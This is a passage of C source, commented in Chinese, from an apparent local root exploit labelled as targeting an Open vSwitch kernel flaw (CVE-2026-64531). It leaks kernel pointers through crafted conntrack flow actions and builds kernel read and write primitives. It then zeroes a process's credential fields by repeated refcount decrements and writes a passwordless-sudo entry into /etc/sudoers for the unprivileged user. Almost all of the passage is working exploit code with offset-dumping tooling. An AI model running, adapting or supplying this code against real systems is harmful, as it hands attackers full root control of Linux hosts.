    int i;

    for (i = 0; i < N_LANES; i++) {
        int v = 0;

        if (read_u8_lane(r, addr, &r->lanes[i], &v) == 0) {
            *out = v;
            return 0;
        }
    }
    return -ENODATA;
}

static int ovs_read_bytes(struct reader *r, uint64_t addr, unsigned char *out,
                          size_t n)
{
    size_t i;

    for (i = 0; i < n; i++) {
        int v = 0;

        if (ovs_read_u8(r, addr + i, &v) != 0)
            return -1;
        out[i] = (unsigned char)v;
    }
    return 0;
}

static int ovs_read_u32(struct reader *r, uint64_t addr, uint32_t *out)
{
    unsigned char b[4];

    if (ovs_read_bytes(r, addr, b, 4) != 0)
        return -1;
    memcpy(out, b, 4);
    return 0;
}

static int ovs_read_u64(struct reader *r, uint64_t addr, uint64_t *out)
{
    unsigned char b[8];

    if (ovs_read_bytes(r, addr, b, 8) != 0)
        return -1;
    memcpy(out, b, 8);
    return 0;
}

/* -------------------------------------------------------------------------
 * 写原语：dst_release() 每次 -1
 * ---------------------------------------------------------------------- */

static int decrement_once(struct writer *w, uint64_t addr)
{
    struct buf key, actions;
    int nc, i;
    int ret = -EINVAL;
    uint64_t tun_dst = addr - (uint64_t)w->k->dst_entry_ref;

    nc = (w->carrier_mode == CARRIER_LABELS_ONLY) ? 1
       : (w->carrier_mode == CARRIER_TIMEOUT) ? 1 : 2;

    for (i = 0; i < nc; i++) {
        int carrier;

        if (w->carrier_mode == CARRIER_AUTO)
            carrier = (i == 0) ? CARRIER_TIMEOUT : CARRIER_LABELS_ONLY;
        else
            carrier = w->carrier_mode;

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        if (!key.p || !actions.p) {
            buf_free(&key);
            buf_free(&actions);
            return -ENOMEM;
        }

        flow_key(&key, ++w->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            w->ct_action_len, w->labels_off);

        ret = ovs_create_flow(w->g, w->flow_family, w->dp_ifindex, &key, &actions);
        if (ret == 0) {
            ret = ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
            buf_free(&key);
            buf_free(&actions);
            return ret;
        }
        ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
        buf_free(&key);
        buf_free(&actions);

        if (ret == -ENOMEM) {
            pr_err("    内存不足：建议重启后重试，或给虚拟机 2GB 以上内存\n");
            return ret;
        }
        if (fake_set_error(ret) && i + 1 < nc)
            continue;
        if (fake_set_error(ret))
            return ret;
        return ret;
    }
    return ret;
}

/* -------------------------------------------------------------------------
 * 指针 / XArray
 * ---------------------------------------------------------------------- */

static uint64_t canonicalize(uint64_t v)
{
    if (v >= 0xFFFF800000000000ULL)
        return v;
    if (v >= 0x0000008000000000ULL && v <= 0x000000FFFFFFFFFFULL)
        return v | 0xFFFFFF0000000000ULL;
    if (v >= 0x0000800000000000ULL && v <= 0x0000FFFFFFFFFFFFULL)
        return v | 0xFFFF000000000000ULL;
    if (v >= 0x0080000000000000ULL && v <= 0x00FFFFFFFFFFFFFFULL)
        return v | 0xFF00000000000000ULL;
    return v;
}

static int is_kernel_ptr(uint64_t v)
{
    uint64_t c = canonicalize(v);

    return c >= 0xFF00000000000000ULL && c <= 0xFFFFFFFFFFFFFFFFULL &&
           (c & 7) == 0;
}

static int read_kptr(struct reader *r, uint64_t addr, const char *label,
                     uint64_t *out)
{
    uint64_t v = 0;

    if (ovs_read_u64(r, addr, &v) != 0) {
        pr_err("  读 %s @0x%llx 失败\n", label, (unsigned long long)addr);
        return -1;
    }
    v = canonicalize(v);
    if (!is_kernel_ptr(v)) {
        pr_err("  %s @0x%llx 不是内核指针: 0x%llx\n", label,
               (unsigned long long)addr, (unsigned long long)v);
        return -1;
    }
    *out = v;
    return 0;
}

static int xarray_entry_to_node(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 2)
        return 0;
    e = canonicalize(e & ~3ULL);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int xarray_entry_to_ptr(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 0)
        return 0;
    e = canonicalize(e);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int read_xarray_entry(struct reader *r, uint64_t addr, const char *label,
                             uint64_t *out)
{
    uint64_t v = 0, p = 0;

    if (ovs_read_u64(r, addr, &v) != 0)
        return -1;
    if (xarray_entry_to_node(v, &p)) {
        *out = p | 2;
        return 0;
    }
    if (xarray_entry_to_ptr(v, &p)) {
        *out = p;
        return 0;
    }
    pr_err("  %s @0x%llx 不是合法 XArray 项: 0x%llx\n", label,
           (unsigned long long)addr, (unsigned long long)v);
    return -1;
}

static int lookup_init_pid_ns_pid(struct reader *r, uint64_t kernel_base,
                                  int pid_nr, uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t idr_addr = kernel_base + k->vmlinux_init_pid_ns + k->pid_namespace_idr;
    uint32_t idr_base = 0;
    uint64_t xarray_addr, entry;
    unsigned long index;
    int depth;

    if (ovs_read_u32(r, idr_addr + k->idr_base, &idr_base) != 0)
        return -1;
    if ((uint32_t)pid_nr < idr_base) {
        pr_err("  pid %d 小于 init_pid_ns.idr_base %u\n", pid_nr, idr_base);
        return -1;
    }
    index = (unsigned long)((uint32_t)pid_nr - idr_base);
    xarray_addr = idr_addr + k->idr_idr_rt;

    if (read_xarray_entry(r, xarray_addr + k->xarray_xa_head,
                          "init_pid_ns.idr.xa_head", &entry) != 0)
        return -1;

    for (depth = 0; depth < 8; depth++) {
        uint64_t node = 0, ptr = 0;

        if (xarray_entry_to_node(entry, &node)) {
            int shift = 0;
            unsigned slot;
            uint64_t slot_addr;

            if (ovs_read_u8(r, node + k->xa_node_shift, &shift) != 0)
                return -1;
            shift &= 0xff;
            if (shift > 60 || shift % 6 != 0) {
                pr_err("  xa_node.shift 异常: %u\n", shift);
                return -1;
            }
            slot = (unsigned)((index >> shift) & 0x3F);
            slot_addr = node + k->xa_node_slots + (uint64_t)slot * 8;
            if (read_xarray_entry(r, slot_addr, "idr slot", &entry) != 0)
                return -1;
            continue;
        }
        if (xarray_entry_to_ptr(entry, &ptr)) {
            *out = ptr;
            return 0;
        }
        break;
    }
    pr_err("  init_pid_ns idr 遍历超过深度限制（pid %d）\n", pid_nr);
    return -1;
}

static int locate_task(struct reader *r, uint64_t kernel_base, int wanted_pid,
                       uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t pid_struct = 0, first = 0, task = 0;
    uint32_t pid = 0;

    if (lookup_init_pid_ns_pid(r, kernel_base, wanted_pid, &pid_struct) != 0)
        return -1;

    if (read_kptr(r, pid_struct + k->pid_tasks + k->hlist_head_first,
                  "pid.tasks.first", &first) != 0)
        return -1;

    task = first - (uint64_t)k->task_pid_links;
    if (!is_kernel_ptr(task)) {
        pr_err("  hlist 指出的 task 非法: 0x%llx\n", (unsigned long long)task);
        return -1;
    }
    if (ovs_read_u32(r, task + k->task_pid, &pid) != 0)
        return -1;
    if ((int)pid != wanted_pid) {
        pr_err("  task.pid=%u，期望 %d\n", pid, wanted_pid);
        return -1;
    }
    pr_dim("  pid_struct=0x%llx task=0x%llx\n",
           (unsigned long long)pid_struct, (unsigned long long)task);
    *out = task;
    return 0;
}

/* -------------------------------------------------------------------------
 * 改 writer 的 cred
 * ---------------------------------------------------------------------- */

static int decrement_to_zero(struct reader *r, struct writer *w, uint64_t addr,
                             const char *label)
{
    uint32_t v = 0, now = 0;
    uint32_t i;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    pr_dim("  %s before=%u\n", label, v);
    if (v > 100000) {
        pr_err("  %s 的值 %u 异常偏大\n", label, v);
        return -1;
    }
    for (i = 0; i < v; i++) {
        if (decrement_once(w, addr) != 0) {
            pr_err("  %s 递减到 %u/%u 时失败\n", label, i, v);
            return -1;
        }
        if (i && i % 250 == 0)
            pr_dim("  %s: %u/%u\n", label, i, v);
    }
    sleep(2);
    if (ovs_read_u32(r, addr, &now) != 0)
        return -1;
    if (now != 0) {
        pr_err("  %s 没有归零，当前 %u\n", label, now);
        return -1;
    }
    pr_ok("  %s 已归零\n", label);
    return 0;
}

static int zero_to_all_ones(struct reader *r, struct writer *w, uint64_t addr,
                            const char *label)
{
    uint32_t v = 0;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    pr_dim("  %s before=0x%08x\n", label, v);
    if (v != 0) {
        pr_err("  %s 不是 0（0x%08x），旧内核 __refcnt 路径不适用\n", label, v);
        return -1;
    }
    if (decrement_once(w, addr) != 0)
        return -1;
    usleep(500 * 1000);
    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    if (v != 0xFFFFFFFFu) {
        pr_err("  %s 没有回绕到 0xffffffff，当前 0x%08x\n", label, v);
        return -1;
    }
    pr_ok("  %s 已回绕为 0xffffffff\n", label);
    return 0;
}

static int panic_on_warn(void)
{
    char b[32] = { 0 };
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");

    if (!f)
        return 0;
    if (!fgets(b, sizeof(b), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    return b[0] != '0' && b[0] != '\n' && b[0] != '\0';
}

/* -------------------------------------------------------------------------
 * host 侧：sudoers 写入子进程
 * ---------------------------------------------------------------------- */

struct host_user {
    uid_t uid;
    gid_t gid;
    char name[64];
};

static int read_self_status_cap(uint64_t *cap)
{
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];

    if (!f)
        return -1;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            fclose(f);
            *cap = strtoull(line + 7, NULL, 16);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static int check_launch_user(struct host_user *u)
{
    uint64_t cap = 0;

    u->uid = getuid();
    u->gid = getgid();
    if (u->uid == 0) {
        pr_err("当前是 root。这个 PoC 要在普通用户下跑，root 没有提权意义。\n");
        pr_dim("    用 su <普通用户> 切过去再运行。\n");
        return -1;
    }
    if (read_self_status_cap(&cap) == 0 && cap != 0) {
        pr_err("当前进程已经带有 capability（CapEff=0x%llx），不是干净起点。\n",
               (unsigned long long)cap);
        return -1;
    }
    {
        struct passwd *pw = getpwuid(u->uid);

        if (pw && pw->pw_name)
            snprintf(u->name, sizeof(u->name), "%s", pw->pw_name);
        else
            snprintf(u->name, sizeof(u->name), "uid%u", (unsigned)u->uid);
    }
    return u->name[0] ? 0 : -1;
}

static int sudo_works(void)
{
    char out[256];

    run_cmd("sudo -n true 2>&1", out, sizeof(out));
    return WEXITSTATUS(0) == 0 && out[0] == '\0';
}

static int sudoers_has_dropin(const char *line)
{
    return line && (!strncmp(line, "#includedir", 11) ||
                    !strncmp(line, "@includedir", 11));
}

static int write_sudoers_dropin(const char *path, const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "%s ALL=(ALL) NOPASSWD:ALL\n", user);
    mkdir("/etc/sudoers.d", 0755);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0440);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fchmod(fd, 0440);
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int append_main_sudoers(const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "\n%s ALL=(ALL:ALL) NOPASSWD:ALL\n", user);
    fd = open("/etc/sudoers", O_WRONLY | O_APPEND);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int write_sudoers_entry(const char *dropin_path, const char *user,
                               char *used, size_t usedlen)
{
    FILE *f = fopen("/etc/sudoers", "r");
    int has_dropin = 0;

    if (f) {
        char line[512];

        while (fgets(line, sizeof(line), f)) {
            if (sudoers_has_dropin(line) && strstr(line, "/etc/sudoers.d")) {
                has_dropin = 1;
                break;
            }
        }
        fclose(f);
    }

    if (has_dropin && write_sudoers_dropin(dropin_path, user) == 0) {
        snprintf(used, usedlen, "%s", dropin_path);
        return 0;
    }
    if (append_main_sudoers(user) == 0) {
        snprintf(used, usedlen, "%s", "/etc/sudoers");
        return 0;
    }
    return -1;
}

static void sleep_forever_detached(void)
{
    setsid();
    {
        int fd = open("/dev/null", O_RDWR);

        if (fd >= 0) {
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            if (fd > 2)
                close(fd);
        }
    }
    for (;;)
        sleep(3600);
}

/*
 * fork 出 host 侧的 sudoers writer。
 * 它一直等到 pipe 上出现 '1'，才把 cred 切到 0（内存已经被改过），
 * 写 sudoers，然后挂起不退 —— 保持进程存在，避免 OVS 里的
 * fake dst_entry 被释放回到 netns 重建路径上。
 */
static pid_t fork_sudoers_writer(const char *dropin, const char *user,
                                 int *trig_out, int *ack_out)
{
    int tr[2], ak[2];
    pid_t pid;

    if (pipe(tr) != 0 || pipe(ak) != 0)
        return -1;

    pid = fork();
    if (pid < 0)
        return -1;

    if (pid == 0) {
        char token = 0;
        char used[512] = "";
        char ack[600];
        int ok;

        close(tr[1]);
        close(ak[0]);

        if (read(tr[0], &token, 1) != 1 || token != '1') {
            close(tr[0]);
            close(ak[1]);
            _exit(1);
        }

        if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0)
            pr_dim("  writer: setresuid 未生效（依赖内存里已改好的 fsuid）\n");

        ok = write_sudoers_entry(dropin, user, used, sizeof(used)) == 0;
        snprintf(ack, sizeof(ack), ok ? "1 %s\n" : "0\n", used);
        (void)!write(ak[1], ack, strlen(ack));
        close(tr[0]);
        close(ak[1]);

        if (ok)
            sleep_forever_detached();
        _exit(0);
    }

    close(tr[0]);
    close(ak[1]);
    *trig_out = tr[1];
    *ack_out = ak[0];
    pr_dim("  host sudoers writer pid=%d\n", (int)pid);
    return pid;
}

/* -------------------------------------------------------------------------
 * namespace
 * ---------------------------------------------------------------------- */

static int write_map(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    n = write(fd, text, strlen(text));
    close(fd);
    return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int enter_private_ns(uid_t uid, gid_t gid)
{
    char map[64];

    if (unshare(CLONE_NEWUSER) != 0) {
        pr_err("unshare(CLONE_NEWUSER) 失败: %s\n", strerror(errno));
        pr_dim("    需要 kernel.unprivileged_userns_clone=1（Ubuntu 20.04 默认允许）\n");
        return -1;
    }
    /* 阻止 setgroups，否则 gid_map 写不进去 */
    write_map("/proc/self/setgroups", "deny");

    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)uid);
    if (write_map("/proc/self/uid_map", map) != 0) {
        pr_err("写 uid_map 失败: %s\n", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)gid);
    if (write_map("/proc/self/gid_map", map) != 0) {
        pr_err("写 gid_map 失败: %s\n", strerror(errno));
        return -1;
    }

    if (unshare(CLONE_NEWNET) != 0) {
        pr_err("unshare(CLONE_NEWNET) 失败: %s\n", strerror(errno));
        return -1;
    }
    if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0) {
        pr_err("进入 userns 后切换到 uid 0 失败: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

/* -------------------------------------------------------------------------
 * 从泄漏的 fake OUTPUT 里找 nf_conntrack_helper*
 * ---------------------------------------------------------------------- */

static int find_helper_pointer(const struct buf *actions, uint64_t *out)
{
    size_t off = 0;
    struct attr top;

    while (attr_next(actions->p, actions->len, &off, &top) == 0) {
        size_t i;
        uint64_t first = 0;

        if (top.type != OVS_ACTION_ATTR_OUTPUT || top.raw_len != 512)
            continue;

        for (i = 0; i + 8 <= top.len; i++) {
            uint64_t v;

            memcpy(&v, top.payload + i, 8);
            if (v < 0xFFFF800000000000ULL)
                continue;
            if (v >= 0xFFFFFFFFC0000000ULL && v <= 0xFFFFFFFFDFFFFFFFULL &&
                (v & 7) == 0) {
                *out = v;
                return 0;
            }
            if (!first)
                first = v;
        }
        if (first) {
            *out = first;
            return 0;
        }
    }
    return -1;
}

/* 失败诊断：把 flow get 回来的 action 链原样打出来，
 * 对照内核实际写入的 nlattr 长度，判断越界读有没有发生。 */
static void dump_flow_actions(const struct buf *b)
{
    size_t off = 0;
    struct attr a;
    int n = 0, i;

    pr_dim("  回读 actions: %zu 字节\n", b->len);
    while (n < 10 && attr_next(b->p, b->len, &off, &a) == 0) {
        pr_dim("    [%d] type=%u raw=%zu payload=%zu\n",
               n, (unsigned)a.type, a.raw_len, a.len);
        n++;
    }
    if (n == 0)
        pr_dim("    (属性解析不出来)\n");

    pr_dim("  前 96 字节:");
    for (i = 0; i < 96 && (size_t)i < b->len; i++)
        pr_dim("%s%02x", (i % 16) ? " " : "\n    ", b->p[i]);
    pr_dim("\n");
}

static int valid_vmlinux_base(uint64_t v)
{
    return v >= 0xFFFFFFFF80000000ULL && v <= 0xFFFFFFFFF0000000ULL &&
           (v % 0x200000ULL) == 0;
}

static int derive_helper_module_ktype(struct reader *r, uint64_t helper_me,
                                      uint64_t helper_ptr, uint64_t *out)
{
    uint64_t module_ptr = 0, ktype = 0;
    uint64_t ktype_addr;

    if (ovs_read_u64(r, helper_me, &module_ptr) != 0) {
        pr_err("  读 helper->me 失败\n");
        return -1;
    }
    module_ptr = canonicalize(module_ptr);

    if (!is_kernel_ptr(module_ptr) ||
        module_ptr < helper_ptr - 0x800000ULL ||
        module_ptr > helper_ptr + 0x800000ULL) {
        pr_err("  helper->me 读出来不是附近的 module 指针: "
               "helper=0x%llx me=0x%llx\n",
               (unsigned long long)helper_ptr,
               (unsigned long long)module_ptr);
        return -1;
    }

    ktype_addr = module_ptr + (uint64_t)r->k->module_kobj_ktype;
    if (ovs_read_u64(r, ktype_addr, &ktype) != 0)
        return -1;
    ktype = canonicalize(ktype);

    if (!valid_vmlinux_base(ktype - r->k->vmlinux_module_ktype)) {
        pr_err("  module.kobj.ktype @0x%llx = 0x%llx，与 vmlinux 符号偏移对不上\n",
               (unsigned long long)ktype_addr, (unsigned long long)ktype);
        return -1;
    }
    pr_dim("  helper->me = 0x%llx（已验证）\n", (unsigned long long)module_ptr);
    *out = ktype;
    return 0;
}

/* -------------------------------------------------------------------------
 * 建立整套原语
 * ---------------------------------------------------------------------- */

struct prim {
    struct genl g;
    struct koffs k;
    struct reader r;
    struct writer w;
    int dp_family;
    int flow_family;
    int dp_ifindex;
    uint64_t helper_ptr;
    uint64_t module_ktype;
    uint64_t kernel_base;
};

/*
 * OVS 的 ct(helper=ftp) 在内核里会走 nf_conntrack_helper_try_module_get()，
 * 拿不到 helper 就返回 -EINVAL，用户态看到的就是
 *     建 helper 泄漏 flow 失败: Invalid argument
 * 所以建 flow 之前先确保 nf_conntrack_ftp 已经加载。这个模块在 Ubuntu
 * 上常常不在默认安装集里（linux-modules-extra），缺失时内核也未必能自动
 * request_module（容器 / 精简 initramfs 里经常禁掉）。
 */
static int module_present(const char *name)
{
    char path[256];
    struct stat st;

    snprintf(path, sizeof(path), "/sys/module/%s", name);
    return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
}

static void ensure_ct_helper(int verbose)
{
    static const char *mods[] = { "nf_conntrack", "nf_conntrack_ftp" };
    size_t i;

    for (i = 0; i < sizeof(mods) / sizeof(mods[0]); i++) {
        char cmd[256], out[1024];
        int n;

        if (module_present(mods[i]))
            continue;

        if (verbose)
            pr_dim("  %s 未加载，尝试 modprobe…\n", mods[i]);

        snprintf(cmd, sizeof(cmd), "modprobe %s 2>&1", mods[i]);
        out[0] = '\0';
        n = run_cmd(cmd, out, sizeof(out));
        if (verbose && n > 0) {
            pr_err("  modprobe %s 失败: %s", mods[i], out);
            if (out[n - 1] != '\n')
                pr_err("\n");
        }
    }
}

static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
{
    struct buf key, actions, leaked;
    unsigned char fake_output[8] = { 0, 2, OVS_ACTION_ATTR_OUTPUT, 0, 0, 0, 0, 0 };
    int ret;

    memset(p, 0, sizeof(*p));

    if (genl_open(&p->g) != 0) {
        pr_err("打开 NETLINK_GENERIC 失败: %s\n", strerror(errno));
        return -1;
    }

    ret = genl_get_family(&p->g, "ovs_datapath", &p->dp_family);
    if (ret < 0) {
        pr_err("找不到 ovs_datapath 这个 generic netlink family（%s）\n",
               strerror(-ret));
        pr_dim("    说明 openvswitch 模块没加载。先执行:\n"
               "      sudo modprobe openvswitch\n"
               "    然后重跑。（Ubuntu 需要装 linux-modules-extra 或 openvswitch 包）\n");
        return -1;
    }
    ret = genl_get_family(&p->g, "ovs_flow", &p->flow_family);
    if (ret < 0) {
        pr_err("找不到 ovs_flow family（%s）\n", strerror(-ret));
        return -1;
    }

    ret = ovs_create_datapath(&p->g, p->dp_family, dp_name);
    if (ret < 0) {
        pr_err("创建 datapath %s 失败: %s\n", dp_name, strerror(-ret));
        return -1;
    }
    p->dp_ifindex = if_nametoindex(dp_name);
    if (p->dp_ifindex <= 0) {
        pr_err("datapath %s 建好了但拿不到 ifindex\n", dp_name);
        return -1;
    }
    pr_dim("  datapath %s ifindex=%d\n", dp_name, p->dp_ifindex);

    if (derive_offsets(&p->k) != 0) {
        pr_err("内核偏移推导失败\n");
        return -1;
    }

    /*
     * 先用 helper 泄漏拿一个 nf_conntrack_helper 指针。
     * fake OUTPUT 的 nlattr 头是 len=512, type=OUTPUT；
     * 后面的 400 个 CT{COMMIT,HELPER} 让解析器越界读到它。
     */
    buf_init(&key, 256);
    buf_init(&actions, 32768);
    buf_init(&leaked, 65536);
    if (!key.p || !actions.p || !leaked.p) {
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }

    /* fake_output 的前两个字节是 len=0x0200(512) */
    fake_output[0] = 0x00;
    fake_output[1] = 0x02;

    /* ct(helper=ftp) 要求 nf_conntrack_ftp 已注册, 否则内核直接 EINVAL */
    ensure_ct_helper(verbose);

    flow_key(&key, 1);

    /*
     * 5.8 起 OVS 在 ovs_ct_copy_action() 里把每个 CT action 展开成
     * struct ovs_conntrack_info 再存入 sf_acts，单个 CT 占 4+n 字节
     * (n 约 56~72)，400 个就顶到 MAX_ACTIONS_BUFSIZE(32768)，内核直接
     * 回 EMSGSIZE —— 表现为 "Message too long" + dmesg
     * "Flow action size exceeds max 32768"。这里从 400 开始按档降级，
     * 取到内核装得下的最大数量（越界读所需的最小垫高量远小于 400）。
     */
    {
        static const int ladder[] = { 400, 320, 256, 200, 160, 128, 96, 64 };
        const int ladder_n = (int)(sizeof(ladder) / sizeof(ladder[0]));
        int k;

        ret = -EMSGSIZE;
        for (k = 0; k < ladder_n; k++) {
            actions.len = 0;
            clone_with_helper_leak(&actions, fake_output, sizeof(fake_output),
                                   ladder[k]);
            ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex,
                                  &key, &actions);
            if (ret != -EMSGSIZE)
                break;
            if (verbose)
                pr_dim("  CT action %d 个超出内核 action 上限，降级重试…\n",
                       ladder[k]);
        }
        if (ret == 0 && verbose)
            pr_dim("  helper 泄漏 flow 已建（CT action %d 个，属性 %zu 字节）\n",
                   k < ladder_n ? ladder[k] : ladder[ladder_n - 1],
                   actions.len);
    }

    if (ret < 0) {
        pr_err("建 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        if (ret == -EMSGSIZE) {
            pr_dim("    内核限制单条 flow 的 action 总长 32KB，最小档位也放不下。\n"
                   "    换更老的内核（CT 不展开成结构体）再试。\n");
        } else if (ret == -EINVAL) {
            pr_dim("    内核拒绝 ct(helper=ftp)，多半是 nf_conntrack_ftp 没加载。\n"
                   "    手工补上再重跑：\n"
                   "      sudo modprobe nf_conntrack_ftp\n"
                   "      ls /sys/module/nf_conntrack_ftp   # 出现的目录即已加载\n");
        } else if (ret == -EOPNOTSUPP || ret == -ENOTSUP) {
            pr_dim("    当前内核的 openvswitch 没编 conntrack 支持，"
                   "ct action 不可用。\n");
        }
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }
    ret = ovs_get_actions(&p->g, p->flow_family, p->dp_ifindex, &key, &leaked);
    ovs_delete_flow(&p->g, p->flow_family, p->dp_ifindex, &key);
    buf_free(&key);
    buf_free(&actions);
    if (ret < 0) {
        pr_err("读回 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        buf_free(&leaked);
        return -1;
    }

    if (find_helper_pointer(&leaked, &p->helper_ptr) != 0) {
        pr_err("泄漏的 OUTPUT 里没有内核指针——这条链在这个内核上可能已修\n");
        dump_flow_actions(&leaked);
        buf_free(&leaked);
        return -1;
    }
    buf_free(&leaked);
    pr_dim("  泄漏到 helper 指针 0x%llx\n", (unsigned long long)p->helper_ptr);

    /* reader / writer */
    memset(&p->r, 0, sizeof(p->r));
    p->r.g = &p->g;
    p->r.flow_family = p->flow_family;
    p->r.dp_ifindex = p->dp_ifindex;
    p->r.k = &p->k;
    p->r.seq = 1000;
    p->r.carrier_mode = g_krec_hit.hit ? g_krec_hit.read_carrier : CARRIER_AUTO;
    p->r.ct_action_len = p->k.ovs_ct_action_len;
    p->r.labels_off = p->k.ovs_ct_labels;
    build_lanes(&p->k, p->r.lanes);

    memset(&p->w, 0, sizeof(p->w));
    p->w.g = &p->g;
    p->w.flow_family = p->flow_family;
    p->w.dp_ifindex = p->dp_ifindex;
    p->w.k = &p->k;
    p->w.seq = 100000000;
    p->w.carrier_mode = g_krec_hit.hit ? g_krec_hit.write_carrier : CARRIER_AUTO;
    p->w.ct_action_len = p->k.ovs_ct_action_len;
    p->w.labels_off = p->k.ovs_ct_labels;

    if (verbose)
        pr_dim("  ct_action_len=%d labels_off=%d dst_ref_kind=%s\n",
               p->k.ovs_ct_action_len, p->k.ovs_ct_labels,
               p->k.ref_kind == 0 ? "__rcuref" : "__refcnt");

    if (derive_helper_module_ktype(&p->r,
                                   p->helper_ptr + (uint64_t)p->k.nf_conntrack_helper_me,
                                   p->helper_ptr, &p->module_ktype) != 0)
        return -1;

    p->kernel_base = p->module_ktype - p->k.vmlinux_module_ktype;
    pr_dim("  module_ktype=0x%llx kernel_base=0x%llx\n",
           (unsigned long long)p->module_ktype,
           (unsigned long long)p->kernel_base);
    return 0;
}

/* -------------------------------------------------------------------------
 * -dump-krec：把本机推导出的偏移打成一条记录，喂给 tools/mk_offset.py
 * ---------------------------------------------------------------------- */

static const char *g_dump_carrier = "timeout";
static const char *g_dump_wcarrier;
static const char *g_dump_from;
static int g_dump_tunnel_info = 31;
static int g_dump_lanes[N_LANES];
static int g_dump_lane_count;
static int g_dump_carrier_set, g_dump_lanes_set, g_dump_ti_set;
static int g_dump_target;      /* -dump-target：输出 target.h 而不是 JSON */

/* -------------------------------------------------------------------------
 * -dump-target：输出一张可直接放进 offset/ 的 target.h
 * ---------------------------------------------------------------------- */

static void print_target(const struct koffs *k, const struct utsname *u)
{
    char ts[64];
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    int i;

    if (!tm || !strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm))
        snprintf(ts, sizeof(ts), "unknown");

    printf("/*\n"
           " * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets\n"
           " *\n"
           " * 放这里：offset/<N>系/<release>/target.h\n"
           " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
           " *\n"
           " * 程序启动时按目录名找本机 release，不需要重新编译。\n"
           " * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。\n"
           " *\n"
           " * 生成: ovswrap -dump-target    %s\n"
           " */\n"
           "#ifndef DIRTYFRAG_TARGET_H\n"
           "#define DIRTYFRAG_TARGET_H\n\n", ts);
    printf("#define KREC_FORMAT        1\n");
    printf("#define KREC_RELEASE       \"%s\"\n", u->release);
    printf("#define KREC_VERSION       \"%s\"\n", u->version);
    printf("#define KREC_VERSION_HASH  %luUL\n", fnv1a32(u->version));
    printf("#define KREC_MACHINE       \"%s\"\n\n", u->machine);

    printf("/* 符号偏移：相对 _text，与 KASLR 无关 */\n");
    printf("#define KREC_VMLINUX_MODULE_KTYPE %luUL\n", k->vmlinux_module_ktype);
    printf("#define KREC_VMLINUX_INIT_PID_NS  %luUL\n\n", k->vmlinux_init_pid_ns);

    printf("/* 结构体字段偏移 */\n");
#define TH_OUT(n, f) printf("#define %-30s %d\n", "KREC_" #n, k->f)
    TH_OUT(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me);
    TH_OUT(MODULE_KOBJ_KTYPE, module_kobj_ktype);
    TH_OUT(TASK_PID, task_pid);
    TH_OUT(TASK_CRED, task_cred);
    TH_OUT(TASK_PID_LINKS, task_pid_links);
    TH_OUT(CRED_FSUID, cred_fsuid);
    TH_OUT(CRED_FSGID, cred_fsgid);
    TH_OUT(CRED_CAP_PERMITTED, cred_cap_permitted);
    TH_OUT(CRED_CAP_EFFECTIVE, cred_cap_effective);
    TH_OUT(PID_NAMESPACE_IDR, pid_namespace_idr);
    TH_OUT(IDR_IDR_RT, idr_idr_rt);
    TH_OUT(IDR_BASE, idr_base);
    TH_OUT(XARRAY_XA_HEAD, xarray_xa_head);
    TH_OUT(XA_NODE_SHIFT, xa_node_shift);
    TH_OUT(XA_NODE_SLOTS, xa_node_slots);
    TH_OUT(PID_TASKS, pid_tasks);
    TH_OUT(HLIST_HEAD_FIRST, hlist_head_first);
    TH_OUT(DST_ENTRY_REF, dst_entry_ref);
    TH_OUT(METADATA_DST_TUN_INFO, metadata_dst_tun_info);
    TH_OUT(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src);
    TH_OUT(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst);
    TH_OUT(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos);
